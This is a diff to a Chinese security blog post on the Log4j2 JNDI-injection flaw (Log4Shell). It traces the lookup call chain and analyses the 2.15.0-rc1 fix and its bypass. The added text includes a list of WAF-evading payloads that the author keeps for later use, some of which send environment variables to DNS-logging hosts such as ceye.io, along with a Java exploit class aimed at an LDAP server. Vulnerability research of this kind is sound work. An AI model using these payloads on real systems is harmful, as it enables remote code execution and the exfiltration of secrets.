@@ -3831,7 +3831,7 @@
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250421224350.png" ></p>
 <p>下面有一个for循环，里面要处理event和buffer，event是我们需要日志打印的内容，另一个buffer，我们会把打印的东西写进buffer</p>
 <p>进去有一个<code>format()</code>方法，可以把他理解成一个处理字符串的方法，具体如何处理是要看具体情况怎么重写的，说是不是很重要。</p>
-<p>总体来说这个循环使用来遍历<code>formatters</code>，中间会做数据处理工作，前面都不是很重要。</p>
+<p>总体来说这个循环使用来遍历<code>formatters</code>，中间会做数据处理工作，前面都不是很重要。比如比如DatePatternConverter，它会格式化一个日期存储到buf中，LiteralPatternConverter就是格式化一个<code>[]</code>符号</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250421235220.png" ></p>
 <p>这里有多个formatter，刚好第七个比较特殊，里面的<code>converter</code>是<code>MessagePatternConverter</code>，会进入到的是一个不一样的format()方法，在<code>PatternFormatter</code>类里面</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250421230453.png" ></p>
@@ -3858,12 +3858,92 @@
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250421233910.png" ></p>
 <p>最后就走到了<code>JndiManager.lookup()</code>，这和之前jndi注入的点就重合了</p>
 <h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>总体流程就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">converter.format() </span><br><span class="line">	-&gt; MessagePatternConverter.fotmat() </span><br><span class="line">		-&gt; StrSubstitutor.replace() </span><br><span class="line">			-&gt; StrSubstitutor.substitute() // 这里面包括对传入payload的递归处理，取出地址</span><br><span class="line">				-&gt; StrSubstitutor.resolveVariable() </span><br><span class="line">					-&gt; lookup()</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li>判断有没有 <code>$&#123;&#125;</code>，有的话把里面的内容取出来</li>
+<li>判断有没有 <code>$&#123;&#125;</code>，有的话把里面的内容取出来，这里涉及到java代码里面递归提取。</li>
 <li>后面使用：去分割payload，通过前缀判断是用什么解析器去lookup</li>
 <li>目前支持的前缀包括 <code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code></li>
 </ul>
-<h3 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h3><p>4.21待更新</p>
+<h3 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h3><p>很多时候waf会检测payload是否存在<code>jndi:</code>等关键词</p>
+<p>常见waf的payload，这里贴一下，以后可能遇到直接拿来用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/a&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://ceye.io/a&#125;</span><br><span class="line">$&#123;jndi:rmi://ceye.io&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;upper:jndi&#125;:$&#123;upper:rmi&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;i:$&#123;upper:rmi&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;upper:j&#125;$&#123;upper:n&#125;$&#123;upper:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://ceye.io/a&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://$&#123;hostName&#125;.ceye.io&#125;</span><br><span class="line">$&#123;$&#123;upper::-j&#125;$&#123;upper::-n&#125;$&#123;::-d&#125;$&#123;upper::-i&#125;:$&#123;upper::-l&#125;$&#123;upper::-d&#125;$&#123;upper::-a&#125;$&#123;upper::-p&#125;://$&#123;hostName&#125;.ceye.io&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://$&#123;hostName&#125;.$&#123;env:COMPUTERNAME&#125;.$&#123;env:USERDOMAIN&#125;.$&#123;env&#125;.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p>官方有一个描述，如果参数未定义，那么 <code>:-</code> 后面的就是默认值，通俗的来说就是默认值</p>
+<h4 id="绕过手法："><a href="#绕过手法：" class="headerlink" title="绕过手法："></a>绕过手法：</h4><h5 id="多个分隔符和-绕过"><a href="#多个分隔符和-绕过" class="headerlink" title="多个分隔符和:-绕过"></a>多个分隔符和:-绕过</h5><p>这块可以看一下这个文章，写的很详细</p>
+<p><a class="link"   href="https://www.cnblogs.com/zpchcbd/p/16200105.html" >https://www.cnblogs.com/zpchcbd/p/16200105.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424102744.png" ></p>
+<h5 id="利用upper和lower绕过"><a href="#利用upper和lower绕过" class="headerlink" title="利用upper和lower绕过"></a>利用upper和lower绕过</h5><p>之前提到过允许的字符就有<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，就有upper和lower，可以利用这个功能绕过检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logg.info(&quot;$&#123;$&#123;lower:J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">logg.info(&quot;$&#123;$&#123;upper:j&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>也可以有一些特殊字符经过处理后变成我们想要的字符</p>
+<blockquote>
+<p>ı &#x3D;&gt; upper &#x3D;&gt; i (Java 中测试可行)</p>
+<p>ſ &#x3D;&gt; upper &#x3D;&gt; S (Java 中测试可行)</p>
+<p>İ &#x3D;&gt; upper &#x3D;&gt; i (Java 中测试不可行)</p>
+<p>K &#x3D;&gt; upper &#x3D;&gt; k (Java 中测试不可行)</p>
+</blockquote>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logg.error(&quot;$&#123;jnd$&#123;upper:ı&#125;:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用其他解析器"><a href="#利用其他解析器" class="headerlink" title="利用其他解析器"></a>利用其他解析器</h5><p>比如通过<code>sys</code>和<code>env</code>协议，结合<code>jndi</code>可以读取到一些环境变量和系统变量，特定情况下可能可以读取到系统密码</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:LOGNAME&#125;.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Log4j2-2-15-0-rc1修复与绕过方法"><a href="#Log4j2-2-15-0-rc1修复与绕过方法" class="headerlink" title="Log4j2 2.15.0-rc1修复与绕过方法"></a>Log4j2 2.15.0-rc1修复与绕过方法</h3><h4 id="修复详情"><a href="#修复详情" class="headerlink" title="修复详情"></a>修复详情</h4><p>在依赖里把log4j换成2.15.0版本的再执行exp就没办法弹计算机了，证明我们给的payload没有按计划走到lookup里面</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424104630.png" ></p>
+<p>看一下修复差别，之前断点在PatternLayout.toSerializable()里，然后会进入PatternFormatter.format()方法</p>
+<p>先不说PatternLayout.toSerializable()里面的变化，进入到format()后就很多不一样了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-04-24%2014.24.29.png" ></p>
+<p>上图是2.14.1 版本的，下图是2.15.0版本的</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-04-24%2014.23.59.png" ></p>
+<p>可以看到<code>converter()</code>变了，这次变成<code>MessagePatternConverter.SimplePatternConverter</code>，而不是2.14.1的<code>MessagePatternConverter</code>，会导致后面进入的format()方法不一样，就没办法进入后面的利用链</p>
+<ul>
+<li>而且2.15.0 版本的 log4j 包还在 <code>JndiManager#lookup</code> 中增加了代码，这个细节后面再处理</li>
+</ul>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>现在绕过先尝试找到一个新的入口，回顾一下之前的函数调用链，这个方法走不通，我们就尝试定位某个方法，看看有没有别的地方调用了直到后面再到<code>lookup()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">converter.format() </span><br><span class="line">	-&gt; MessagePatternConverter.fotmat() </span><br><span class="line">		-&gt; StrSubstitutor.replace() </span><br><span class="line">			-&gt; StrSubstitutor.substitute() // 这里面包括对传入payload的递归处理，取出地址</span><br><span class="line">				-&gt; StrSubstitutor.resolveVariable() </span><br><span class="line">					-&gt; lookup()</span><br></pre></td></tr></table></figure>
+
+<p>于是前辈找到了MessagePatternConverter里面另一个format()方法，里面调用了replaceIn()方法</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424144254.png" ></p>
+<p>走到里面看一下，里面就有**substitute()**，属于<code>StrSubstitutor</code>类，后面的东西就和前面一样了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424144334.png" ></p>
+<p>回看调用 <code>replaceIn()</code> 方法的 <code>format()</code> 方法是<code>LookupMessagePatternConverter</code>类的，这个类继承了<code>MessagePatternConverter</code>，现在为了进入这个format()，我们要让前面的converter是<code>LookupMessagePatternConverter</code>类，how to do?</p>
+<p>前辈找到了在 <code>newInstance()</code> 方法中会调用 <code>loadLookups()</code> 这个方法（里面有判断 <code>if (&quot;lookups&quot;.equalsIgnoreCase(option)) </code>符合判断才会返回true），然后出来之后有两个判断，这里要构造一下才能控制返回的converter是我们想要的<code>LookupMessagePatternConverter</code>类</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-04-24%2014.50.46.png" ></p>
+<p>目前就是这些限制，需要手动修改他们，为了方便调试在log4j.xml里面添加新内容</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">status</span>=<span class="string">&quot;OFF&quot;</span> <span class="attr">monitorInterval</span>=<span class="string">&quot;30&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">console</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE-APPENDER&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%m&#123;lookups&#125;%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appenders</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE-APPENDER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后现在的exp是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j2EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConfiguration</span>();</span><br><span class="line">        <span class="type">MessagePatternConverter</span> <span class="variable">messagePatternConverter</span> <span class="operator">=</span> MessagePatternConverter.newInstance(configuration,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;lookups&quot;</span>&#125;);</span><br><span class="line">        <span class="type">LogEvent</span> <span class="variable">logEvent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MutableLogEvent</span>(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1/RchSAKscwA/CommonsCollections6/Exec/eyJjbWQiOiJvcGVuIC1hIGNhbGN1bGF0b3IifQ==&#125;&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        messagePatternConverter.format(logEvent,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1/RchSAKscwA/CommonsCollections6/Exec/eyJjbWQiOiJvcGVuIC1hIGNhbGN1bGF0b3IifQ==&#125;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以运行一下，还是有问题</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424145717.png" ></p>
+<p>看回显是不支持反序列化数据，调试进入看一下</p>
+<p>前面的过程可以忽略，都差不多，我们来到<code>JndiManager#lookup</code>里面，可以看到有很大的变化</p>
+<p>这是2.14.1的 很简单就是直接走到lookup了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424150623.png" ></p>
+<p>再看2.15.0的，里面多了很多代码，多了限制</p>
+<blockquote>
+<p>有对 javaSerializedData 中的 classname 做了处理；以及 Reference 和 javaFactory 做了处理，也就是对 JDNI 注入做了处理</p>
+</blockquote>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424150832.png" ></p>
+<p>多了一些白名单allowedHosts和allowedProtocols</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424150924.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424151036.png" ></p>
+<p>有这些判断所以用rmi绕过是走不通的</p>
+<p>此时我们传入的payload是反序列化类型的，所以会走到<code>if (!this.allowedClasses.contains(className)) </code>的判断</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424151501.png" ></p>
+<p>很不幸就进入if了，直接return 结束了方法</p>
+<p>所以要绕过这个判断，这里借用别的师傅rc1环境的图，我的环境用了2.15.0-rc2的环境</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424151755.png" ></p>
+<p>思路是直接不进入后面的if判断就好了，然后直接到最后直接lookup，所以可以把payload改成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1234/ ExportObject&#125;</span><br></pre></td></tr></table></figure>
+
+<p>多一个空格不是正常url格式绕过，反正异常没有别的影响</p>
+<p>这样就能绕过2.15.0版本的修改按计划走到lookup里面了！</p>
+<h4 id="2-15-0-rc2版本修复"><a href="#2-15-0-rc2版本修复" class="headerlink" title="2.15.0-rc2版本修复"></a>2.15.0-rc2版本修复</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250424152221.png" ></p>
+<p>这是rc2的lookup，故意给个不正常的url会直接return，卒！</p>
 ]]></content>
       <tags>
         <tag>java</tag>
